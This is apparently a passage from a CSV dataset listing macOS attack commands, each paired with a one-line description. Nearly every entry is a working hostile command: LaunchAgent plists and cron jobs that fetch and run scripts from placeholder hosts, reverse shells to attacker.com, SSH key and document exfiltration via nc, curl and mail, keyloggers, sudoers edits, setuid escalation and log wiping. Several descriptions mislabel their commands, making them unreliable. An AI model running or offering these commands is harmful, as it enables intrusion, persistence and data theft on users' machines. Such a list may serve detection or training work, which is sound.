<!DOCTYPE plist PUBLIC ""-//Apple//DTD PLIST 1.0//EN"" ""http://www.apple.com/DTDs/PropertyList-1.0.dtd"">
<plist version=""1.0"">
<dict>
	<key>Label</key>
	<string>com.malicious.agent</string>
	<key>ProgramArguments</key>
	<array>
		<string>/usr/bin/env</string>
		<string>sh</string>
		<string>-c</string>
		<string>curl -fsSL http://malicious-url.com/script.sh | sh</string>
	</array>
	<key>RunAtLoad</key>
	<true/>
</dict>
</plist>' > ~/Library/LaunchAgents/com.malicious.agent.plist && launchctl load ~/Library/LaunchAgents/com.malicious.agent.plist","Persistence on macOS via a malicious Launch Agent plist file that executes a shell script on user login."
"curl -s http://malicious-url.com/fake-update.sh | sh","Malware installation through a fake software update prompt executed in the terminal."
"ssh -fN -R 2222:localhost:22 attacker@remote-server.com","Establishing a reverse SSH tunnel from a compromised macOS system to allow secure access for data exfiltration."
"tar -czvf /tmp/data-archive.tgz /path/to/sensitive/data","Compressing a directory containing sensitive data before exfiltration on a macOS system."
"hydra -l user -P /usr/share/wordlists/rockyou.txt ssh://remote-server.com","Using SSH to perform a brute force attack against a remote server's SSH service from a macOS system."
"osascript -e 'tell application ""System Events"" to make new login item at end with properties {path:""/Applications/evil.app"", hidden:false}'","Persistence via login item added to a user's login items list."
"echo 'curl -s http://malicious-url.com/remote.sh | sh' > /Applications/MediaPlayer.app/Contents/MacOS/startup && chmod +x /Applications/MediaPlayer.app/Contents/MacOS/startup","Persistence via trojanized media player software that executes a remote shell script upon launch."
"sudo tcpdump -i en0 -w ~/Desktop/captured_traffic.pcap","Capturing network packets to monitor traffic and analyze data on a macOS system."
"echo '<?xml version=""1.0"" encoding=""UTF-8""?>
<!DOCTYPE plist PUBLIC ""-//Apple//DTD PLIST 1.0//EN"" ""http://www.apple.com/DTDs/PropertyList-1.0.dtd"">
<plist version=""1.0"">
<dict>
 <key>Label</key>
 <string>com.malicious.reverse</string>
 <key>ProgramArguments</key>
 <array>
 <string>/bin/bash</string>
 <string>-c</string>
 <string>bash -i >& /dev/tcp/attacker.com/4444 0>&1</string>
 </array>
 <key>RunAtLoad</key>
 <true/>
</dict>
</plist>' > ~/Library/LaunchAgents/com.malicious.reverse.plist && launchctl load ~/Library/LaunchAgents/com.malicious.reverse.plist","Persistence via malicious plist to establish a reverse shell connection on system boot."
"bash -c ""$(curl -fsSL http://suspicious-url.com/install.sh)""","Malware installation via a disguised Bash script downloaded from a phishing email."
"osascript -e 'Tell application ""System Events"" to display dialog ""Enter Apple ID Password:"" default answer """" with hidden answer' > /tmp/credentials.txt","Phishing attack script that masquerades as a legitimate service to capture user credentials."
"echo 'cat ~/.ssh/id_rsa | nc -w 3 attacker.com 5555' >> ~/.bash_profile","Credential interception by appending a command to the .bash_profile to send stored SSH keys to a remote server."
"echo '157.240.1.35 facebook.com' | sudo tee -a /etc/hosts","DNS spoofing by altering the /etc/hosts file to redirect traffic to a malicious site."
"cp /path/to/malicious_script.osax /Library/ScriptingAdditions/malicious_script.osax","Persistence via scripting addition by placing a malicious script in the ScriptingAdditions directory."
"echo 'bash -i >& /dev/tcp/attacker.com/4444 0>&1' >> ~/.ssh/rc","Persistence by adding a malicious script to SSH login sequence."
"ssh-keygen -t rsa -N '' -f ~/.ssh/id_rsa && cat ~/.ssh/id_rsa.pub | ssh username@target.com 'cat >> ~/.ssh/authorized_keys'","Gaining unauthorized remote access to a macOS system by exploiting weak SSH daemon configurations."
"cp /bin/sh /tmp/privileged_sh && chmod 4755 /tmp/privileged_sh && /tmp/privileged_sh -p","Privilege escalation by exploiting a setuid binary to gain root access."
"0 * * * * /usr/bin/curl -fsSL http://malicious-url.com/script.sh | /bin/bash","Persistence via a cron job that downloads and executes a script every hour."
"while true; do screencapture -x ~/captures/$(date +%s).png; sleep 300; done & osascript -e 'tell application ""System Events"" to set visible of every application process to false' && python -m SimpleHTTPServer 8000","Automating the capture of screenshots at regular intervals and distributing them via peer-to-peer sharing."
"curl -s http://malicious-url.com/fakeupdate.pkg > /tmp/fakeupdate.pkg && sudo installer -pkg /tmp/fakeupdate.pkg -target /","Infection of macOS system by installing a trojan application disguised as a legitimate software update."
"curl -o ~/Library/.hiddenkeylogger http://malicious-url.com/keylogger && chmod +x ~/Library/.hiddenkeylogger && ~/Library/.hiddenkeylogger & disown","A scenario where a keylogger is installed to monitor and log keystrokes on a macOS system."
"while true; do pbpaste > /tmp/clipboard.log; sleep 10; done & disown","A method for monitoring and capturing clipboard content on a macOS system."
"echo '*/1 * * * * pbpaste >> ~/Library/Logs/clipboard_capture.log && curl --upload-file ~/Library/Logs/clipboard_capture.log http://malicious-url.com/upload' | crontab -","An approach to set up automatic clipboard capture to a file that is periodically sent to a remote server."
"echo '<?xml version=""1.0"" encoding=""UTF-8""?>
<!DOCTYPE plist PUBLIC ""-//Apple//DTD PLIST 1.0//EN"" ""http://www.apple.com/DTDs/PropertyList-1.0.dtd"">
<plist version=""1.0"">
<dict>
	<key>Label</key>
	<string>com.malicious.payload</string>
	<key>ProgramArguments</key>
	<array>
		<string>curl</string>
		<string>-o</string>
		<string>/tmp/payload</string>
		<string>http://malicious-url.com/payload</string>
		<string>;</string>
		<string>chmod</string>
		<string>+x</string>
		<string>/tmp/payload</string>
		<string>;</string>
		<string>/tmp/payload</string>
	</array>
	<key>RunAtLoad</key>
	<true/>
</dict>
</plist>' > ~/Library/LaunchAgents/com.malicious.payload.plist && launchctl load ~/Library/LaunchAgents/com.malicious.payload.plist","Persistence via malicious plist file that executes a remote payload."
"echo '<?xml version=""1.0"" encoding=""UTF-8""?>
<!DOCTYPE plist PUBLIC ""-//Apple//DTD PLIST 1.0//EN"" ""http://www.apple.com/DTDs/PropertyList-1.0.dtd"">
<plist version=""1.0"">
<dict>
 <key>Label</key>
 <string>com.cloud.exfiltrate</string>
 <key>ProgramArguments</key>
 <array>
 <string>/bin/bash</string>
 <string>-c</string>
 <string>zip -r /tmp/data.zip ~/Documents && /usr/bin/curl -X PUT -T /tmp/data.zip https://cloud-storage.com/upload</string>
 </array>
 <key>RunAtLoad</key>
 <true/>
 <key>StartInterval</key>
 <integer>3600</integer>
</dict>
</plist>' > ~/Library/LaunchAgents/com.cloud.exfiltrate.plist && launchctl load ~/Library/LaunchAgents/com.cloud.exfiltrate.plist","Persistence via malicious plist to exfiltrate data through cloud services."
"chmod o+w /var/log/system.log","Privilege escalation by manipulating file permissions to gain write access to system logs."
"chmod 777 /var/log/system.log","Privilege escalation by manipulating file permissions to alter system logs permissions."
"sudo chown $(whoami) /var/log/system.log","Changing ownership of log files to gain unauthorized access."
"echo ""* * * * * /bin/bash -c \""$(curl -fsSL http://malicious-url.com/payload.sh)\"""" | crontab -","Persistence mechanism involving the scheduling of a cron job to repeatedly execute a script hosted on a remote server."
"echo '<?xml version=""1.0"" encoding=""UTF-8""?>
<!DOCTYPE plist PUBLIC ""-//Apple//DTD PLIST 1.0//EN"" ""http://www.apple.com/DTDs/PropertyList-1.0.dtd"">
<plist version=""1.0"">
<dict>
	<key>Label</key>
	<string>com.malicious.exploit</string>
	<key>ProgramArguments</key>
	<array>
		<string>/path/to/exploit/binary</string>
	</array>
	<key>RunAtLoad</key>
	<true/>
</dict>
</plist>' > ~/Library/LaunchAgents/com.malicious.exploit.plist && launchctl load ~/Library/LaunchAgents/com.malicious.exploit.plist","Persistence via malicious plist file to exploit kernel vulnerabilities for privilege escalation."
"screencapture -x ~/Desktop/capture.png && curl -T ~/Desktop/capture.png ftp://attacker.com/uploads/","Screen capture automation to exfiltrate sensitive information."
"echo 'while :; do nc -e /bin/sh attacker_ip 4444; sleep 300; done' >> ~/.hidden_backdoor && chmod +x ~/.hidden_backdoor && echo '@reboot ~/.hidden_backdoor' | crontab -","Persistence via a hidden backdoor using reverse shell on macOS."
"curl -s http://malicious-url.com/install.sh | sh","Malware installation using a disguised script downloaded from a remote server."
"curl -o /tmp/exploit.zip http://malicious-url.com/exploit.zip && unzip /tmp/exploit.zip -d /tmp/exploit && sh /tmp/exploit/run.sh","Exploit kit execution by decompressing a ZIP file containing the kit and running it."
"echo ""* * * * * /bin/bash -i >& /dev/tcp/c2.server.com/8080 0>&1"" | crontab -","Establishing command and control communication by adding a cron job to ping back to a C2 server periodically."
"curl -o ~/Library/Updates/update.sh http://malicious-url.com/update.sh && chmod +x ~/Library/Updates/update.sh && ~/Library/Updates/update.sh","Updating malware by fetching the latest version from a remote server and executing it."
"echo '<?xml version=""1.0"" encoding=""UTF-8""?>
<!DOCTYPE plist PUBLIC ""-//Apple//DTD PLIST 1.0//EN"" ""http://www.apple.com/DTDs/PropertyList-1.0.dtd"">
<plist version=""1.0"">
<dict>
	<key>Label</key>
	<string>com.malicious.reverse</string>
	<key>ProgramArguments</key>
	<array>
		<string>/bin/sh</string>
		<string>-c</string>
		<string>bash -i >& /dev/tcp/attacker.com/4444 0>&1</string>
	</array>
	<key>RunAtLoad</key>
	<true/>
</dict>
</plist>' > ~/Library/LaunchAgents/com.malicious.reverse.plist && launchctl load ~/Library/LaunchAgents/com.malicious.reverse.plist","Persistence via malicious plist to establish a reverse shell connection."
"curl -s http://compromised-repository.com/fakeupdate.pkg > /tmp/update.pkg && sudo installer -pkg /tmp/update.pkg -target /","Malware installation via a disguised software update command."
"curl -s http://malicious-url.com/install.sh | bash","Malware installation through a disguised Bash script downloaded from a remote server."
"cat /tmp/malicious_binary >> /usr/bin/legitimate_binary","Rootkit embedding by appending a malicious binary to an existing system binary."
"sudo insmod /tmp/malicious_module.ko","Kernel module injection using insmod with a tainted kernel module."
"sudo defaults write /Library/LaunchDaemons/com.apple.loginwindow.plist Program /tmp/malicious_script","Boot process tampering by modifying the system's launchd daemons."
"osascript -e 'do shell script ""chmod +s /path/to/vulnerable/kernel/binary"" with administrator privileges'","Privilege escalation by exploiting a use-after-free vulnerability in macOS kernel."
"echo '<?xml version=""1.0"" encoding=""UTF-8""?>
<!DOCTYPE plist PUBLIC ""-//Apple//DTD PLIST 1.0//EN"" ""http://www.apple.com/DTDs/PropertyList-1.0.dtd"">
<plist version=""1.0"">
<dict>
 <key>Label</key>
 <string>com.malicious.agent</string>
 <key>ProgramArguments</key>
 <array>
 <string>/usr/bin/curl</string>
 <string>-s</string>
 <string>http://malicious-url.com/script.sh</string>
 <string>|</string>
 <string>/bin/bash</string>
 </array>
 <key>RunAtLoad</key>
 <true/>
</dict>
</plist>' > ~/Library/LaunchAgents/com.malicious.agent.plist && launchctl load ~/Library/LaunchAgents/com.malicious.agent.plist","Persistence via a malicious Launch Agent that executes a script every time the user logs in."
"tar -czf hidden_data.tar.gz ~/Documents/sensitive/* && exiftool -comment='$(base64 hidden_data.tar.gz)' image.jpg","Compressing sensitive documents and hiding them in image metadata."
"echo ""* * * * * /usr/bin/find / -type f -size +100M -exec /bin/cp {} /Volumes/USB/ ""; crontab -l | { cat; echo ""* * * * * /usr/bin/find / -type f -size +100M -exec /bin/cp {} /Volumes/USB/ ""; } | crontab -","Persistence via unauthorized file monitoring script in crontab."
"sudo tcpdump -i en0 -w unauthorized_capture.pcap","Capturing network traffic on a macOS system without authorization."
"echo '*/5 * * * * /usr/bin/curl http://malicious-url.com/rootkit.sh | /bin/bash' | sudo crontab -","Privilege escalation by injecting malicious code into root's crontab."
"echo '<?xml version=""1.0"" encoding=""UTF-8""?>
<!DOCTYPE plist PUBLIC ""-//Apple//DTD PLIST 1.0//EN"" ""http://www.apple.com/DTDs/PropertyList-1.0.dtd"">
<plist version=""1.0"">
<dict>
 <key>Label</key>
 <string>com.malicious.agent</string>
 <key>ProgramArguments</key>
 <array>
 <string>sh</string>
 <string>-c</string>
 <string>curl -fsSL http://malicious-url.com/script.sh | sh</string>
 </array>
 <key>StartInterval</key>
 <integer>3600</integer>
</dict>
</plist>' > ~/Library/LaunchAgents/com.malicious.agent.plist && launchctl load ~/Library/LaunchAgents/com.malicious.agent.plist","Persistence via Launch Agent by scheduling a task that downloads and executes a script every hour."
"echo 'PATH=/usr/local/bin:/usr/bin:/bin' > /tmp/.hidden && echo '@reboot root cd / && run-parts --report /etc/cron.hourly' >> /tmp/.hidden && crontab /tmp/.hidden","Privilege escalation by exploiting cron jobs with obfuscated commands."
"tar -czvf sensitive_data.tar.gz /path/to/sensitive/files","Sensitive files are being compressed into an archive using tar before exfiltration."
"split -b 10m sensitive_data.tar.gz 'sensitive_data.tar.gz.part-'","The archive is being split into multiple smaller files to avoid detection during exfiltration."
"echo '<?xml version=""1.0"" encoding=""UTF-8""?>
<!DOCTYPE plist PUBLIC ""-//Apple//DTD PLIST 1.0//EN"" ""http://www.apple.com/DTDs/PropertyList-1.0.dtd"">
<plist version=""1.0"">
<dict>
 <key>Label</key>
 <string>com.malicious.keylogger</string>
 <key>ProgramArguments</key>
 <array>
 <string>/usr/bin/python</string>
 <string>/Users/Shared/keylogger.py</string>
 </array>
 <key>RunAtLoad</key>
 <true/>
</dict>
</plist>' > ~/Library/LaunchAgents/com.malicious.keylogger.plist && launchctl load ~/Library/LaunchAgents/com.malicious.keylogger.plist","Persistence via malicious plist to log keystrokes"
"zip -r /tmp/documents.zip ~/Documents && scp /tmp/documents.zip user@legitimate-server.com:/path/to/legitimate/directory","Compressing sensitive files in the user's Documents directory and exfiltrating them via SSH using scp, with the transfer disguised as legitimate traffic."
"scp ~/.ssh/id_rsa user@remote-server.com:/path/to/upload","Data exfiltration by uploading SSH private keys to a remote server."
"echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC3...' >> ~/.ssh/authorized_keys","Setting up remote access by adding a public key to the authorized_keys file."
"cp ~/.ssh/id_rsa /tmp/evil_location","Theft of SSH keys by copying the private key to an attacker-controlled location."
"echo 'ssh-rsa AAAAB3Nza... attacker@domain.com' > ~/.ssh/authorized_keys","Replacing the public key in the authorized_keys file with an attacker's key."
"curl -s http://malicious-url.com/installer.sh | sh","Malware installation using a disguised curl command to retrieve a malicious payload from a remote server and execute it."
"echo 'echo ""malicious code"" > /etc/malicious_startup.sh' >> /etc/rc.common","Rootkit embedding by appending a malicious script to an existing system startup file."
"touch ~/.hidden_stolen_data && chmod 000 ~/.hidden_stolen_data","Creation of hidden files in the system to store stolen data."
"sed -i '' '/attack_signature/d' /var/log/system.log","System log alterations to hide evidence of an attack."
"osascript -e 'do shell script ""launchctl setenv DYLD_INSERT_LIBRARIES /path/to/malicious.dylib"" with administrator privileges'","Injecting code into privileged processes on macOS to escalate privileges."
"while read -r line; do echo $line >> ~/Library/.keystroke_log; done < /dev/tty","A script that captures keystrokes and saves them to a file for later retrieval."
"ssh -D 1337 -q -C -N user@example.com","Establishing dynamic port forwarding to create a SOCKS proxy for data exfiltration."
"while true; do screencapture -x ~/Library/Logs/screenshot_$(date +'%Y%m%d%H%M%S').png; sleep 300; done & echo 'while [ 1 ]; do cat /dev/input/keyboard0 > ~/Library/Logs/keystroke_$(date +'%Y%m%d%H%M%S').log; sleep 60; done' >> ~/.zshrc && source ~/.zshrc","Capturing keystrokes and taking periodic screenshots for data exfiltration on a macOS system."
"echo '<?xml version=""1.0"" encoding=""UTF-8""?><!DOCTYPE plist PUBLIC ""-//Apple//DTD PLIST 1.0//EN"" ""http://www.apple.com/DTDs/PropertyList-1.0.dtd""><plist version=""1.0""><dict><key>Label</key><string>com.backdoor.agent</string><key>ProgramArguments</key><array><string>/usr/bin/osascript</string><string>-e</string><string>do shell script ""bash -i >& /dev/tcp/attacker.com/4444 0>&1""</string></array><key>RunAtLoad</key><true/></dict></plist>' > ~/Library/LaunchAgents/com.backdoor.agent.plist && launchctl load ~/Library/LaunchAgents/com.backdoor.agent.plist","Persistence via malicious plist to establish a backdoor on macOS."
"find / -type f -mmin -5","Identifying unauthorized file copies by monitoring file access timestamps."
"tar czf - ~/ | openssl enc -aes-256-cbc -e -k secretkey | nc -w 3 attacker.com 8888","Exfiltration of the entire user's home directory to a remote server."
"echo 'bash -i >& /dev/tcp/attacker.com/4444 0>&1' >> ~/.bash_profile && source ~/.bash_profile","Setting up remote access by installing a reverse shell that connects back to the attacker's server."
"ssh -N -R 2222:localhost:22 user@attacker.com","Forwarding a local port to a remote server to tunnel traffic through the compromised machine."
"osascript -e 'tell application ""System Events"" to keystroke ""logging keystrokes""' >> /Applications/TargetApp.app/Contents/MacOS/TargetApp &","Persistent keylogging by appending a script to capture keystrokes to an application's launch process."
"echo '<?xml version=""1.0"" encoding=""UTF-8""?>
<!DOCTYPE plist PUBLIC ""-//Apple//DTD PLIST 1.0//EN"" ""http://www.apple.com/DTDs/PropertyList-1.0.dtd"">
<plist version=""1.0"">
<dict>
	<key>Label</key>
	<string>com.malicious.daemon</string>
	<key>ProgramArguments</key>
	<array>
		<string>/usr/bin/curl</string>
		<string>-o</string>
		<string>/tmp/malicious_script.sh</string>
		<string>http://malicious-url.com/malicious_script.sh</string>
	</array>
	<key>RunAtLoad</key>
	<true/>
</dict>
</plist>' > ~/Library/LaunchAgents/com.malicious.daemon.plist && launchctl load ~/Library/LaunchAgents/com.malicious.daemon.plist","Persistence via malicious plist file"
"TF=$(mktemp -u); cp $(which dash) $TF; chmod +s $TF; $TF -p","Privilege escalation by exploiting a setuid binary to execute a shell as a superuser."
"osascript -e 'tell application ""Finder"" to load script file ""/Library/ScriptingAdditions/malicious.osax""'","Persistence mechanism via scripting addition in macOS"
"echo '#!/bin/bash\ncurl -fsSL http://malicious-url.com/payload.sh | bash' > /Library/StartupItems/Payload/StartupParameters.plist","Creating a startup item to execute a payload on macOS"
"sudo defaults write com.apple.loginwindow LoginHook /path/to/malicious/script.sh","Using LoginHook script to establish persistence"
"osascript -e 'do shell script ""chmod 4755 /bin/bash"" with administrator privileges'","Privilege escalation by exploiting a patched kernel flaw through a race condition"
"sudo defaults write com.apple.loginwindow LoginHook /path/to/malicious/script.sh","Persistence via login hook that executes a script every time a user logs in."
"find / -perm -4000 -type f -exec chmod o+w {} \;","Privilege escalation by exploiting SUID bit on a vulnerable binary to modify system logs permissions."
"chmod 777 /var/log/system.log","Altering system logs permissions to gain unauthorized access to sensitive log files."
"echo 'CVE-2021-XYZ: Exploit code' > /path/to/log/management/software/vulnerable/script","Exploiting vulnerabilities in log management software to escalate privileges and modify file permissions."
"echo '<?xml version=""1.0"" encoding=""UTF-8""?>
<!DOCTYPE plist PUBLIC ""-//Apple//DTD PLIST 1.0//EN"" ""http://www.apple.com/DTDs/PropertyList-1.0.dtd"">
<plist version=""1.0"">
<dict>
 <key>Label</key>
 <string>com.malicious.backdoor</string>
 <key>ProgramArguments</key>
 <array>
 <string>/usr/bin/bash</string>
 <string>-c</string>
 <string>bash -i >& /dev/tcp/attacker.com/4444 0>&1</string>
 </array>
 <key>RunAtLoad</key>
 <true/>
</dict>
</plist>' > ~/Library/LaunchAgents/com.malicious.backdoor.plist && launchctl load ~/Library/LaunchAgents/com.malicious.backdoor.plist","Persistence via malicious plist to maintain remote access."
"cp /bin/sh /tmp/privilegedsh && chmod +s /tmp/privilegedsh && /tmp/privilegedsh -p","Privilege escalation by exploiting a setuid binary."
"TF=$(mktemp) && echo '#!/bin/sh
/bin/sh -i' > $TF && chmod +x $TF && cp $TF /tmp/privileged && chmod u+s /tmp/privileged && /tmp/privileged","Abusing setuid binaries to execute arbitrary code with elevated privileges."
"rar a -v10m -R sensitive-docs.rar ~/Documents/Sensitive && cat sensitive-docs.rar image.jpg > hidden.jpg","Compression of sensitive documents into a multi-part RAR archive followed by concealing it within an image file on a macOS system."
"curl -s http://malicious-url.com/install.sh | sh","Malware installation using a disguised curl command to download and execute a script."
"sudo sh -c 'mkdir /.hidden && mv script.sh /.hidden/ && chmod +x /.hidden/script.sh && /.hidden/script.sh'","Rootkit embedding through a hidden directory and executing a local script with elevated privileges."
"DYLD_INSERT_LIBRARIES=malicious.dylib /Applications/VulnerableApp.app/Contents/MacOS/VulnerableApp","Process hooking by injecting code into running processes using dynamic libraries."
"echo '<?xml version=""1.0"" encoding=""UTF-8""?>
<!DOCTYPE plist PUBLIC ""-//Apple//DTD PLIST 1.0//EN"" ""http://www.apple.com/DTDs/PropertyList-1.0.dtd"">
<plist version=""1.0"">
<dict>
	<key>Label</key>
	<string>com.malicious.reinstall</string>
	<key>ProgramArguments</key>
	<array>
		<string>/bin/sh</string>
		<string>-c</string>
		<string>curl -s http://malicious-url.com/install.sh | sh</string>
	</array>
	<key>RunAtLoad</key>
	<true/>
</dict>
</plist>' > ~/Library/LaunchAgents/com.malicious.reinstall.plist && launchctl load ~/Library/LaunchAgents/com.malicious.reinstall.plist","Establishing persistent hooks by adding a script to launchd that reinstalls the malware if removed."
"screencapture -x ~/Desktop/screenshot.png","Capturing screenshots of user activity silently on macOS systems."
"echo '<?xml version=""1.0"" encoding=""UTF-8""?>
<!DOCTYPE plist PUBLIC ""-//Apple//DTD PLIST 1.0//EN"" ""http://www.apple.com/DTDs/PropertyList-1.0.dtd"">
<plist version=""1.0"">
<dict>
	<key>Label</key>
	<string>com.malicious.backdoor</string>
	<key>ProgramArguments</key>
	<array>
		<string>/usr/bin/bash</string>
		<string>-c</string>
		<string>bash -i >& /dev/tcp/attacker.com/4444 0>&1</string>
	</array>
	<key>RunAtLoad</key>
	<true/>
</dict>
</plist>' > ~/Library/LaunchAgents/com.malicious.backdoor.plist && launchctl load ~/Library/LaunchAgents/com.malicious.backdoor.plist","Persistence via malicious plist to maintain remote access."
"echo '* * * * * cd /usr/local/bin/ && sudo ./malicious_script.sh' | crontab -","Privilege escalation by exploiting crontab to execute a script from a common directory with elevated privileges."
"echo 'ALL ALL=(ALL) NOPASSWD: ALL' >> /etc/sudoers","Malicious command to escalate privileges by adding an unauthorized user to the sudoers file without proper permissions."
"echo '<?xml version=""1.0"" encoding=""UTF-8""?>
<!DOCTYPE plist PUBLIC ""-//Apple//DTD PLIST 1.0//EN"" ""http://www.apple.com/DTDs/PropertyList-1.0.dtd"">
<plist version=""1.0"">
<dict>
	<key>Label</key>
	<string>com.malicious.keylogger</string>
	<key>ProgramArguments</key>
	<array>
		<string>/usr/local/bin/keylogger</string>
	</array>
	<key>RunAtLoad</key>
	<true/>
</dict>
</plist>' > ~/Library/LaunchAgents/com.malicious.keylogger.plist && launchctl load ~/Library/LaunchAgents/com.malicious.keylogger.plist","Persistence via malicious plist to execute a keylogger at login"
"find ~/Documents -name '*.pdf' -exec echo {} \; | while read file; do uuencode ""$file"" ""$(basename ""$file"")"" | mail -s ""Sensitive Document"" -a ""From: exfiltrator@example.com"" recipient@example.com; done","Exfiltrating sensitive documents from a macOS system by sending them via email using an automated script."
"osascript -e 'tell application ""System Events"" to make new login item at end with properties {path:""/path/to/malicious.app"", hidden:false}'","Persistence mechanism using scripting additions to load malicious code at login"
"echo '<?xml version=""1.0"" encoding=""UTF-8""?><!DOCTYPE plist PUBLIC ""-//Apple//DTD PLIST 1.0//EN"" ""http://www.apple.com/DTDs/PropertyList-1.0.dtd""><plist version=""1.0""><dict><key>Label</key><string>com.malicious.persist</string><key>ProgramArguments</key><array><string>/usr/bin/curl</string><string>-s</string><string>http://malicious-url.com/remote_access_tool</string><string>-o</string><string>/tmp/remote_access_tool</string></array><key>RunAtLoad</key><true/></dict></plist>' > ~/Library/LaunchAgents/com.malicious.persist.plist && launchctl load ~/Library/LaunchAgents/com.malicious.persist.plist","Persistence via malicious plist to maintain access to macOS systems."
"while :; do read -rsn1 input; if [ ""$input"" = ""a"" ]; then screencapture -x ~/Desktop/screenshot_$(date +%s).png; fi; done","A script that captures the screen every time a specific key is pressed."
"script -q /dev/null | gzip > ~/Library/Logs/user_activity_$(date +%Y%m%d%H%M%S).log.gz &","A command to log user activity discreetly."
"sudo python -c 'import sys, time; f = open(""/.hidden_keystrokes"", ""a""); while True: c = sys.stdin.read(1); f.write(c); f.flush(); time.sleep(0.01);' < /dev/tty > /dev/null 2>&1 &","A keylogger that writes keystrokes to a hidden file."
"curl -o ~/Library/.hidden_script http://malicious-url.com/install.sh && chmod +x ~/Library/.hidden_script && ~/Library/.hidden_script","Malware installation via a disguised script downloaded from the internet."
"cat /tmp/malicious_payload >> /bin/legitimate_binary && chmod +x /bin/legitimate_binary","Rootkit embedding by appending a malicious payload to an existing system binary."
"touch ~/Library/.hidden_stolen_data && chmod 600 ~/Library/.hidden_stolen_data","Creation of a hidden file in the user's home directory to store stolen data."
"sudo kextload /tmp/malicious_extension.kext","Kernel module tampering to insert a malicious kernel extension."
"chmod u+s /bin/bash","Privilege escalation by exploiting SUID bit on a binary to run a shell with root privileges."
"chmod 777 /etc/passwd","Manipulating file permissions to grant world-writable access to a sensitive file."
"sudo chown $(whoami) /etc/sudoers","Changing ownership of sensitive system files to the current user."
"echo '' > /var/log/system.log","Altering system logs to cover tracks after gaining unauthorized access."
"echo '<?xml version=""1.0"" encoding=""UTF-8""?>
<!DOCTYPE plist PUBLIC ""-//Apple//DTD PLIST 1.0//EN"" ""http://www.apple.com/DTDs/PropertyList-1.0.dtd"">
<plist version=""1.0"">
<dict>
 <key>Label</key>
 <string>com.malicious.agent</string>
 <key>ProgramArguments</key>
 <array>
 <string>/usr/bin/curl</string>
 <string>-s</string>
 <string>http://malicious-url.com/payload</string>
 <string>-o</string>
 <string>/tmp/malicious_payload</string>
 </array>
 <key>RunAtLoad</key>
 <true/>
</dict>
</plist>' > ~/Library/LaunchAgents/com.malicious.agent.plist && launchctl load ~/Library/LaunchAgents/com.malicious.agent.plist","Persistence via malicious plist in LaunchAgents"
"osascript -e 'tell application ""System Events"" to make new login item at end with properties {path:""/path/to/malicious/script.sh"", hidden:false}'","Adding a Login Item to execute a script on user login"
"sudo mkdir /Library/StartupItems/MaliciousStartupItem && echo '#!/bin/sh

. /etc/rc.common

StartService () {
 /path/to/malicious/script.sh
}

stop_restart () {
 :
}

RunService ""$1""' > /Library/StartupItems/MaliciousStartupItem/MaliciousStartupItem && sudo chmod +x /Library/StartupItems/MaliciousStartupItem/MaliciousStartupItem","Manipulating StartupItems folder to execute malicious code at startup"
"find ~/Documents -type f -name '*.confidential' -exec sh -c 'tar czf - {} | openssl base64' \; | mail -s 'Confidential Data' -r 'spoofed@example.com' recipient@malicious-domain.com","Exfiltrating confidential information from a macOS system by emailing it to an external address using a spoofed sender."
"echo '<?xml version=""1.0"" encoding=""UTF-8""?>
<!DOCTYPE plist PUBLIC ""-//Apple//DTD PLIST 1.0//EN"" ""http://www.apple.com/DTDs/PropertyList-1.0.dtd"">
<plist version=""1.0"">
<dict>
	<key>Label</key>
	<string>com.malicious.screencapture</string>
	<key>ProgramArguments</key>
	<array>
		<string>/usr/bin/curl</string>
		<string>-o</string>
		<string>/tmp/screenshotapp</string>
		<string>http://malicious-url.com/trojanapp</string>
	</array>
	<key>RunAtLoad</key>
	<true/>
	<key>StartInterval</key>
	<integer>300</integer>
</dict>
</plist>' > ~/Library/LaunchAgents/com.malicious.screencapture.plist && launchctl load ~/Library/LaunchAgents/com.malicious.screencapture.plist","Persistence via malicious plist to install a trojan application that captures screenshots."
"echo 'ALL ALL=(ALL) NOPASSWD: /bin/bash *' | sudo EDITOR='tee -a' visudo","Privilege escalation by exploiting a wildcard misconfiguration in sudoers file."
"echo 'function sudo() { echo ""$@"" > /tmp/credentials; /usr/bin/sudo ""$@""; }' >> ~/.bashrc && source ~/.bashrc","Overriding system commands using function definitions in shell startup files to capture credentials."
"export PATH=/malicious/directory:$PATH","Manipulating environment variables to inject malicious code execution."
"echo '<?xml version=""1.0"" encoding=""UTF-8""?>
<!DOCTYPE plist PUBLIC ""-//Apple//DTD PLIST 1.0//EN"" ""http://www.apple.com/DTDs/PropertyList-1.0.dtd"">
<plist version=""1.0"">
<dict>
	<key>Label</key>
	<string>com.malicious.agent</string>
	<key>ProgramArguments</key>
	<array>
		<string>/usr/local/bin/malicious_script.sh</string>
	</array>
	<key>RunAtLoad</key>
	<true/>
</dict>
</plist>' > ~/Library/LaunchAgents/com.malicious.agent.plist && launchctl load ~/Library/LaunchAgents/com.malicious.agent.plist","Persistence by creating a malicious Launch Agent that executes a script on user login."
"curl -s http://malicious-url.com/install.sh | sh","Malware installation using a disguised script from a remote server."
"DYLD_INSERT_LIBRARIES=keylogger.dylib /Applications/TargetApp.app/Contents/MacOS/TargetApp","Injection of a keylogger into an existing process."
"sed -i '' '/malicious/d' /var/log/system.log","Modification of system logs to hide malicious activity."
"sudo tcpdump -i en0 -w ~/Desktop/suspicious_traffic.pcap","Interception of network traffic by unauthorized packet sniffing on a macOS system."
"echo '127.0.0.1 www.legitimatewebsite.com' | sudo tee -a /etc/hosts","Redirection of all web traffic to a malicious site by altering the hosts file."
"networksetup -setdnsservers Wi-Fi 198.51.100.1","DNS hijacking by changing the DNS server settings to point to a malicious server."
"while true; do pbpaste > /tmp/clipboard.txt; sleep 10; done &","Stealth clipboard monitoring through a hidden process on macOS."
"find / -perm +6000 -type f -exec ls -ld {} \;","Identifying setuid and setgid files that could be exploited for privilege escalation."
"curl -s http://phishing-website.com/malicious-install.sh | /bin/bash","Malware installation through a disguised Bash script downloaded from a phishing email attachment."
"find ~/Documents -type f -name '*.doc' -exec openssl rsautl -encrypt -pubin -inkey public.pem -in '{}' -out '{}'.enc \; -exec curl -T '{}'.enc http://malicious-server.com/upload \;","Automatic transmission of documents with encryption using public key before exfiltration on a macOS system."
"chmod 000 /var/log/system.log","Altering system logs permissions to prevent logging of future actions."
"echo '<?xml version=""1.0"" encoding=""UTF-8""?>
<!DOCTYPE plist PUBLIC ""-//Apple//DTD PLIST 1.0//EN"" ""http://www.apple.com/DTDs/PropertyList-1.0.dtd"">
<plist version=""1.0"">
<dict>
	<key>Label</key>
	<string>com.mykeylogger.agent</string>
	<key>ProgramArguments</key>
	<array>
		<string>/usr/local/bin/mykeylogger</string>
	</array>
	<key>RunAtLoad</key>
